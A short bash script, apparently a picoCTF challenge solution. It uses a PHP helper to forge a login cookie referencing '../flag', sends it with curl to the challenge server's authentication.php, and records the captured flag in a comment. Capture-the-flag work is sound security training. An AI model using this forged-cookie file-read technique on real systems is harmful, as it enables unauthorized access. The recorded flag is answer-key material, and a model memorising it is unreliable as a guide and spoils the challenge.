#!/bin/bash


login_cookie=`php forge_cookie.php ../flag`
curl http://mercury.picoctf.net:14804/authentication.php -H "Cookie: login=${login_cookie}"

# picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_261d1dcc}
